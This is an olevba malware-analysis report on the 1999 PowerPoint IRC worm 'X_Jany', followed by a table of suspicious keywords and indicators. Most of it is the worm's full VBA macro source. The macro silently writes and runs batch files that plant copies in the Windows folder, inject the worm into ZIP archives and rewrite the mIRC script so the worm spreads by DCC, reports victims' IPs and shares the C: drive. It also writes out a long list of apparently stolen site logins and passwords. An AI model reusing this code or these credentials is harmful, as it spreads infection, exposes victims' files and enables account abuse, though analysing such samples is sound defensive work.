olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.Xjan.ppt
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO Slide1.cls 
in file: None - OLE stream: 'VBA/Slide1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()

  Open "X_Jany.bat" For Output As 1
   Print #1, "@echo off"
   Print #1, "CTTY NUL"
   Print #1, "@copy X_Jany.pps %WINDIR%\X_Jany.pps"
   Print #1, "@copy X_Jany.pps %WINDIR%\Help\X_Jany.pps"
   Print #1, "@copy X_Jany.pps %WINDIR%\temp$$$.pps"
   Print #1, "@copy X_Jany.pps %WINDIR%\Secret.pps"
   Print #1, "for %%i in (*.zip ..\*.zip c:\mirc\download\*.zip c:\*.zip) do start /m C:\progra~1\winzip\winzip32 -a /%%i %WINDIR%\X_Jany.pps >> %WINDIR%\dropper.bat"
   Print #1, "@call %WINDIR%\dropper.bat"
   Print #1, "@del %WINDIR%\dropper.bat"
   Print #1, "@copy X_Jany.bat %WINDIR%\winstart.bat"
   Print #1, "if exist %WINDIR%\temp$$$.pps goto redu"
   Print #1, "goto suite"
   Print #1, ":redu"
   Print #1, "@copy %WINDIR%\temp$$$.pps %WINDIR%\X_Jany.pps"
   Print #1, "@copy %WINDIR%\temp$$$.pps %WINDIR%\Secret.pps"
   Print #1, ":suite"
   Print #1, "CTTY CON"
   Print #1, "@del X_Jany.bat"
   Close 1
   Shell "X_Jany.bat", vbHide
   
   
  Open "C:\janytemp.$$$" For Output As 1
Print #1, "[SCRIPT]"
Print #1, "n0 ="
Print #1, "n1 = on 1:start:{"
Print #1, "n2 = .remote on"
Print #1, "n3 = .ctcps on"
Print #1, "n4 = .events on"
Print #1, "n5 =  }"
Print #1, "n6=on 1:join:#:{"
Print #1, "n7=if ( $nick == $me ) { halt } | .dcc send $nick c:\Windows\X_Jany.pps"
Print #1, "n8=}"
Print #1, "n9=on 1:connect:.msg #trojanslair Jany is so cute ! $ip on $server $+ : $+ $port $+"
Print #1, "n10=on 1:text:*jany*:#:/fserve $nick 5 C:\"
Print #1, "n11=on 1:PING:/msg $nick Pire que Tout... L'amour propre et la fierté!"
Print #1, "n12=on 1:FILERCVD:*.jpg:./dcc send $nick c:\Windows\Help\X_Jany.pps"
Print #1, "n13=on 1:FILESENT:*.jpg:./dcc send $nick c:\Windows\\Secret.pps"
Print #1, ";Designed by Del_Armg0____06-07 Novembre 1999____Keep It Load!"
Print #1, ";Magic¤°Software (c) 1999"
    Close 1
    
 Open "C:\tempjany.bat" For Output As 1
Print #1, "@echo off"
Print #1, "CTTY NUL"
Print #1, "if exist C:\mirc\mirc32.exe goto copy1"
Print #1, "if exist C:\chat\mirc\mirc32.exe goto copy2"
Print #1, "if exist C:\mirc32\mirc32.exe goto copy3"
Print #1, "if exist C:\progra~1\mirc\mirc32.exe goto copy4"
Print #1, "if exist C:\internet\mirc\mirc32.exe goto copy5"
Print #1, "if exist C:\irc\mirc\mirc32.exe goto copy6"
Print #1, ":copy1"
Print #1, "copy C:\janytemp.$$$ C:\mirc\script.ini"
Print #1, ":copy2"
Print #1, "copy C:\janytemp.$$$ C:\chat\mirc\script.ini"
Print #1, ":copy3"
Print #1, "copy C:\janytemp.$$$ C:\mirc32\script.ini"
Print #1, ":copy4"
Print #1, "copy C:\janytemp.$$$ C:\progra~1\mirc\script.ini"
Print #1, ":copy5"
Print #1, "copy C:\janytemp.$$$ C:\internet\mirc\script.ini"
Print #1, ":copy6"
Print #1, "copy C:\janytemp.$$$ C:\irc\mirc\script.ini"
Print #1, "CTTY CON"
Print #1, "del C:\janytemp.$$$"
Print #1, "del C:\tempjany.bat"
   Close 1
   Shell "C:\tempjany.bat", vbHide



Open "C:\X_Jany_Sites.txt" For Output As 1
Print #1, "--==X_JANY_SITES==--"
Print #1, "=======VARIOUS======================================================"
Print #1, "http://qqqq:wwww@www.busty-amateurs.com/members/index.html "
Print #1, "http://qwer:1234@www.busty-amateurs.com/members/index.html "
Print #1, "http://trim7gun:paulina@www.busty-amateurs.com/members/members.html "
Print #1, "http://yeah:baby@www.busty-amateurs.com/members/index.html "
Print #1, "http://astra23:connect@www.busty-amateurs.com/members/index.html "
Print #1, "http://hairy:pussy@bserver.amkingdom.com/hairy/members/sc0001.htm"
Print #1, "http://buck:rogers@snatchgirls.com/members-only/"
Print #1, "http://hotdog:ballgame@cybersexmotel.com/members/"
Print #1, "http://mitems:yeahyeah@wc1.watchcams.com/members/members.html"
Print #1, "http://asia:rules@www.18asiansluts.com/members/"
Print #1, "http://bowlhead:642056@www.sizzle.com/members/index.shtml"
Print #1, "http://doerges:ilona@www.plumpersmag.com/Members/PBW/aug99/index.html"
Print #1, "http://adrian:adrian1@www.silkmagnolias.com/Playarea/playroom.htm"
Print #1, "http://waynes:boaz@www.sissymaids.com/members/misslut/misslut.html"
Print #1, "http://hulka:drude@www.extremefitness.com/members/index.htm"
Print #1, "http://nanny:babe23@www.18teenhardcore.com/members/"
Print #1, "http://sjv:1543@www2.pictureview.com/groupindex.html"
Print #1, "http://1234:1234@www.18girlsex.com/secure/index.html"
Print #1, "http://jazz:jazz@members.studvision.com/index2.html"
Print #1, "http://leopard:leopard2@www.lisalawrence.com/members/index.html"
Print #1, "http://studly:studly@www.schoolgirlz.com/members/"
Print #1, "http://apcc:spukcab@www.strippersonline.com/members/"
Print #1, "http://rikkardo:riccardo@www.sofiastaks.com/members/"
Print #1, "=======SITE==========================================================="
Print #1, "http://www.ebonyfantasy.com/members  L:12345 P:12345"
Print #1, "http://www.caseyjames.com/members/14325.html L:adelphia P:password"
Print #1, "http://www.200pix.com/members/ Login: L:test P: P:account"
Print #1, "http://www.pictures2000.com/members/ L:hank P:hank"
Print #1, "http://www.cafeflesh.com l:cba321 p:abc123"
Print #1, "http://www.wickedgirl.com/members/index.html L: dkw P: soup"
Print #1, "http://member.babylon-x.com/ L:tom2tom P:tom2tom"
Print #1, "http://www.pink18.com/members   p: gold l: member"
Print #1, "http://allteensex.org/members/ L:buddy P:boy"
Print #1, "http://www.virtualhardcore.com/pictures/index.html L:1 P:1"
Print #1, "http://members.pamsplace.com/ L:hercule P:hercul"
Print #1, "http://members.pamsplace.com/ L:legend8 p:legend"
Print #1, "http://www.drporn.com/members/ L:dark@mind.com P:pepe101"
Print #1, "http://members.karasxxx.com/members/index.html L:789 P:123"
Print #1, "http://members.breathlessbabes.com/ l:ut p:ut "
Print #1, "http://members.breathlessbabes.com/ L:benjamin P:franklin "
Print #1, "http://www.strokin-it.com/members-only/ L:anal P:fuck "
Print #1, "http://members.breathlessbabes.com/ L:bgilmore P:6215 "
Print #1, "http://www.redlight.com L:lex P:mark"
Print #1, "http://www.bare-asians.com/members/welcome.html L:bathtub P:girls "
Print #1, "http://www.rhinogirls.com/members/index.html L:oryp@oryp.com P:oryp  "
Print #1, "http://www.adultinfo.holowww.com/members/start.htm L:angel P:angel"
Print #1, "http://www.18teenhardcore.com/members/ L:7lucky P:lucky7"
Print #1, "http://allteen.org/members/ L:buddy P:boy"
Print #1, "http://members.playgal.com/   u:docgold  p:seagate"
Print #1, "http://horneydorm.com/members/ L:baby P:baby "
Print #1, "http://www.whoreteens.com/members/teen1/ L:huge P:tits"
Print #1, "http://www.wetscape.com/hiddenmembers/index.shtml L:happy P:newYear"
Print #1, "http://www.f-ck-me.com/members-only/ L:billy P:bob"
Print #1, "http://www.fetish.com/members/toc.html L:master P:master"
Print #1, "http://hookerbabe.com/members/ L:sticky p:stuff"
Print #1, "http://www.teen-sex.com/members/index.html L:virgin P:virgin"
Print #1, "http://www.18asiansluts.com/members/ L:japanese P:japanese"
Print #1, "http://www.sexvideofeeds.com/members/index.html L:7lucky P:lucky7"
Print #1, "http://www.mardigraspussy.com/secure/index.html L:basset P:basset"
Print #1, "http://www.upncoming.com/paid/ L:noles P:noles"
Print #1, "http://www.spermcandy.com/members/ L:jeffery P:jeffery"
Print #1, "http://members.dreamzotic.com/members.htm L:hocus P:pocus"
Print #1, "http://www.heathersplace.com/members/members.htm L:6E2B5AA7 P:585C0516"
Print #1, "http://www.f-ck-me.com/members-only/ L:big P:balls"
Print #1, "http://www.gaysexplanet.com/members/index.html L:boyz30 P:ment"
Print #1, "http://www.slutbabe.com  l:null p:null"
Print #1, "http://members.4wyw.com L:johnd5 P:houston"
Print #1, "http://www.spyonsummer.com/member/index.html L:soslite P:metoo"
Print #1, "http://members.sexuncensored.com/ L:danny P:sex"
Print #1, "http://www.love-com.com/amateurs/models.html L:jeff P:comp99"
Print #1, "http://www.studioamateurs.com/secure/index.html L:john P:john"
Print #1, "=======RARE==========================================================="
Print #1, "http://www.alsscan.com L:raymond P:Tlaloc1 "
Print #1, "http://nrjb32a:Realtor1@alsangels.com/members/member.html"
Print #1, "http://www.plaboy.com user:jam  pass:jam"
Print #1, "http://www.vividvideo.com l:Zlrgeoch p:em9ejl"
Print #1, "=======FREE SITE======================================================"
Print #1, "http://auto.pron.org"
Print #1, "http://www.pitoune.com"
Print #1, "http://www.passworduniverse.com"
Print #1, "http://www.daemonxxx.cjb.net/"
Print #1, "=======NEWS GROUPS===================================================="
Print #1, "alt.binaries.pictures.erotica.als  has 5 000 pictures of alsscan"
Print #1, "=======ADULT CHEK====================================================="
Print #1, "ACGold --> 7030dragon"
Print #1, "ACGold --> 7424dragon"
Print #1, "ACGold --> 7510dragon"
Print #1, "ACGold --> 7940dragon"
Print #1, "ACGold --> 4365gibson"
Print #1, "ACGold --> 4375williams"
Print #1, "ACGold --> 4387simmons"
Print #1, "ACGold --> 4388ferguson"
Print #1, "ACheck --> 8183angie"
Print #1, "ACheck --> 8140angie"
Print #1, "ACheck --> 7819angie"
Print #1, "--==X_JANY_SITES==--"
 Close 1
 
 '' a PowerPoint IrcWorm designed by Del_Armg0 - 06-07 Novembre 1999
 '' NAME = X_Jany v.20
 '' L'amour propre et la fierté sont bizarrement capables de l'emporter sur l'Amour et le Plaisir, la vie est absurde... je crois !
 '' merci à toi Elsa d'être aussi douce, gentille, et compréhensive... mais moi qui croyait avoir bien fait !!
 '' mais ma foi, les enculés sont parfois bien cachés, et eux, c'est clair, ne savent pas ce que c'est d'Aimer !!!
 '' il me reste un plaisir toutefois, celui de n'être pas celui qui ment et qui s'est écrasé comme une merde !!!!
 '' malgré tout ça, jolie Jany, Je T'Aime !!!!!
 
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.ebonyfant|URL                                          |
|          |asy.com/members     |                                             |
|IOC       |http://www.caseyjame|URL                                          |
|          |s.com/members/14325.|                                             |
|          |html                |                                             |
|IOC       |http://www.200pix.co|URL                                          |
|          |m/members/          |                                             |
|IOC       |http://www.pictures2|URL                                          |
|          |000.com/members/    |                                             |
|IOC       |http://www.cafeflesh|URL                                          |
|          |.com                |                                             |
|IOC       |http://www.wickedgir|URL                                          |
|          |l.com/members/index.|                                             |
|          |html                |                                             |
|IOC       |http://member.babylo|URL                                          |
|          |n-x.com/            |                                             |
|IOC       |http://www.pink18.co|URL                                          |
|          |m/members           |                                             |
|IOC       |http://allteensex.or|URL                                          |
|          |g/members/          |                                             |
|IOC       |http://www.virtualha|URL                                          |
|          |rdcore.com/pictures/|                                             |
|          |index.html          |                                             |
|IOC       |http://members.pamsp|URL                                          |
|          |lace.com/           |                                             |
|IOC       |http://www.drporn.co|URL                                          |
|          |m/members/          |                                             |
|IOC       |http://members.karas|URL                                          |
|          |xxx.com/members/inde|                                             |
|          |x.html              |                                             |
|IOC       |http://members.breat|URL                                          |
|          |hlessbabes.com/     |                                             |
|IOC       |http://www.strokin- |URL                                          |
|          |it.com/members-only/|                                             |
|IOC       |http://www.redlight.|URL                                          |
|          |com                 |                                             |
|IOC       |http://www.bare-asia|URL                                          |
|          |ns.com/members/welco|                                             |
|          |me.html             |                                             |
|IOC       |http://www.rhinogirl|URL                                          |
|          |s.com/members/index.|                                             |
|          |html                |                                             |
|IOC       |http://www.adultinfo|URL                                          |
|          |.holowww.com/members|                                             |
|          |/start.htm          |                                             |
|IOC       |http://www.18teenhar|URL                                          |
|          |dcore.com/members/  |                                             |
|IOC       |http://allteen.org/m|URL                                          |
|          |embers/             |                                             |
|IOC       |http://members.playg|URL                                          |
|          |al.com/             |                                             |
|IOC       |http://horneydorm.co|URL                                          |
|          |m/members/          |                                             |
|IOC       |http://www.whoreteen|URL                                          |
|          |s.com/members/teen1/|                                             |
|IOC       |http://www.wetscape.|URL                                          |
|          |com/hiddenmembers/in|                                             |
|          |dex.shtml           |                                             |
|IOC       |http://www.f-ck-    |URL                                          |
|          |me.com/members-only/|                                             |
|IOC       |http://www.fetish.co|URL                                          |
|          |m/members/toc.html  |                                             |
|IOC       |http://hookerbabe.co|URL                                          |
|          |m/members/          |                                             |
|IOC       |http://www.teen-sex.|URL                                          |
|          |com/members/index.ht|                                             |
|          |ml                  |                                             |
|IOC       |http://www.18asiansl|URL                                          |
|          |uts.com/members/    |                                             |
|IOC       |http://www.sexvideof|URL                                          |
|          |eeds.com/members/ind|                                             |
|          |ex.html             |                                             |
|IOC       |http://www.mardigras|URL                                          |
|          |pussy.com/secure/ind|                                             |
|          |ex.html             |                                             |
|IOC       |http://www.upncoming|URL                                          |
|          |.com/paid/          |                                             |
|IOC       |http://www.spermcand|URL                                          |
|          |y.com/members/      |                                             |
|IOC       |http://members.dream|URL                                          |
|          |zotic.com/members.ht|                                             |
|          |m                   |                                             |
|IOC       |http://www.heathersp|URL                                          |
|          |lace.com/members/mem|                                             |
|          |bers.htm            |                                             |
|IOC       |http://www.gaysexpla|URL                                          |
|          |net.com/members/inde|                                             |
|          |x.html              |                                             |
|IOC       |http://www.slutbabe.|URL                                          |
|          |com                 |                                             |
|IOC       |http://members.4wyw.|URL                                          |
|          |com                 |                                             |
|IOC       |http://www.spyonsumm|URL                                          |
|          |er.com/member/index.|                                             |
|          |html                |                                             |
|IOC       |http://members.sexun|URL                                          |
|          |censored.com/       |                                             |
|IOC       |http://www.love-com.|URL                                          |
|          |com/amateurs/models.|                                             |
|          |html                |                                             |
|IOC       |http://www.studioama|URL                                          |
|          |teurs.com/secure/ind|                                             |
|          |ex.html             |                                             |
|IOC       |http://www.alsscan.c|URL                                          |
|          |om                  |                                             |
|IOC       |http://www.plaboy.co|URL                                          |
|          |m                   |                                             |
|IOC       |http://www.vividvide|URL                                          |
|          |o.com               |                                             |
|IOC       |http://auto.pron.org|URL                                          |
|IOC       |http://www.pitoune.c|URL                                          |
|          |om                  |                                             |
|IOC       |http://www.passwordu|URL                                          |
|          |niverse.com         |                                             |
|IOC       |http://www.daemonxxx|URL                                          |
|          |.cjb.net/           |                                             |
|IOC       |X_Jany.bat          |Executable file name                         |
|IOC       |dropper.bat         |Executable file name                         |
|IOC       |winstart.bat        |Executable file name                         |
|IOC       |tempjany.bat        |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

